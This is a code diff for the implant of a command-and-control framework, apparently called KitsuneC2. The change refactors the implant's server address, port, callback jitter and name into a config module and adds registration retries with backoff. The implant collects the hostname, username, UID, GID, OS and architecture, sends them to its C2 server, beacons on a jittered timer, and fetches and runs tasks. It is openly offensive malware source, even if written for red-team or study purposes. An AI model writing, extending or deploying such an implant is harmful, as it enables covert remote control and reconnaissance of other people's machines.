@@ -1,6 +1,7 @@
 package main
 
 import (
+	"KitsuneC2/implant/config"
 	"KitsuneC2/lib/communication"
 	"KitsuneC2/lib/cryptography"
 	"encoding/json"
@@ -16,14 +17,8 @@ import (
 )
 
 const (
-	implantName string = "BabyImplant"
-	serverIp    string = "127.0.0.1"
-	serverPort  int    = 4444
-
-	callbackInterval int    = 10
-	callbackJitter   int    = 2
-	implantOs        string = runtime.GOOS
-	ImplantArch      string = runtime.GOARCH
+	implantOs   string = runtime.GOOS
+	implantArch string = runtime.GOARCH
 )
 
 var (
@@ -32,17 +27,20 @@ var (
 )
 
 func main() {
-	initialize()
-	kitsuneLoop()
+	initSuccess := initialize()
+
+	if initSuccess {
+		kitsuneLoop()
+	}
 }
 
 // main loop of the implant: Sleep for x amount of time, check for server commands, execute commands
 func kitsuneLoop() {
 	for !shouldTerminate {
-		var waitTime = math.Abs(float64(callbackInterval + int(float32(callbackJitter)*(0.5-rand.Float32()))))
+		var waitTime = math.Abs(float64(config.CallbackInterval + int(float32(config.CallbackJitter)*(0.5-rand.Float32()))))
 		time.Sleep(time.Duration(waitTime) * time.Second)
 
-		conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
+		conn, err := net.Dial("tcp", config.ServerIp+":"+strconv.Itoa(config.ServerPort))
 		if err != nil {
 			continue
 		}
@@ -61,30 +59,56 @@ func kitsuneLoop() {
 }
 
 // Gathers basic information about the system, generates a unque implant ID, and sends a message of type "ImplantRegister" to the server.
-func initialize() error {
+func initialize() bool {
 	var currentUser, _ = user.Current()
 	var hostname, _ = os.Hostname()
-	implantId = cryptography.GenerateMd5FromStrings(hostname, currentUser.Username, implantName) //Generates unique ID based on hostname, username and implantName
+	implantId = cryptography.GenerateMd5FromStrings(hostname, currentUser.Username, config.ImplantName) //Generates unique ID based on hostname, username and implantName
 
-	msg := communication.ImplantRegister{ImplantId: implantId, ImplantName: implantName, Hostname: hostname, Username: currentUser.Username, UID: currentUser.Uid, GID: currentUser.Gid}
+	msg := communication.ImplantRegisterReq{ImplantId: implantId, ImplantName: config.ImplantName, Hostname: hostname, Username: currentUser.Username, UID: currentUser.Uid, GID: currentUser.Gid, Os: implantOs, Arch: implantArch}
 
-	conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
-	if err != nil {
-		return err
+	attempts := 0
+	success := false
+
+	for attempts < config.MaxRegisterRetryCount && !success { //We try to connect to the server "maxRegisterRetryCount" times
+		time.Sleep(time.Duration(attempts) * time.Minute) //with each failed attempt, we wait a bit longer.
+		attempts++
+
+		conn, err := net.Dial("tcp", config.ServerIp+":"+strconv.Itoa(config.ServerPort))
+		if err != nil {
+			continue
+		}
+		err = SendEnvelopeToServer(conn, 0, msg)
+		if err != nil {
+			conn.Close()
+			continue
+		}
+
+		messageType, data, err := ReceiveEnvelopeFromServer(conn)
+		if err != nil {
+			conn.Close()
+			continue
+		}
+		if messageType != 1 { //server should send a ImplantRegisterResp message
+			conn.Close()
+			continue
+		}
+		conn.Close()
+		registerResp := data.(*communication.ImplantRegisterResp)
+		success = registerResp.Success
 	}
-	defer conn.Close()
-	err = SendEnvelopeToServer(conn, 0, msg)
-	if err != nil {
-		return err
+
+	if !success { //if we have tried to register MaxRegisterRetryCount, and still failed, we give up and kill the implant.
+		return false
+	} else {
+		return true
 	}
-	return nil
 }
 
 // Sends message of type "ImplantCheckin" to server and returns (if any) a list of tasks with their arguments.
 func checkIn(conn net.Conn) (*[]int, *[]interface{}, error) {
 	msg := communication.ImplantCheckinReq{ImplantId: implantId}
 
-	err := SendEnvelopeToServer(conn, 1, msg)
+	err := SendEnvelopeToServer(conn, 2, msg)
 	if err != nil {
 		return nil, nil, err
 	}
@@ -93,7 +117,7 @@ func checkIn(conn net.Conn) (*[]int, *[]interface{}, error) {
 	if err != nil {
 		return nil, nil, err
 	}
-	if messageType != 2 {
+	if messageType != 3 {
 		return nil, nil, errors.New("Expected implantCheckinResp but got: " + strconv.Itoa(messageType))
 	}
 	checkInResp, ok := data.(*communication.ImplantCheckinResp)
@@ -117,7 +141,7 @@ func checkIn(conn net.Conn) (*[]int, *[]interface{}, error) {
 }
 
 func executeTask(taskType int, arguments interface{}) {
-	conn, err := net.Dial("tcp", serverIp+":"+strconv.Itoa(serverPort))
+	conn, err := net.Dial("tcp", config.ServerIp+":"+strconv.Itoa(config.ServerPort))
 	if err != nil {
 		return
 	}
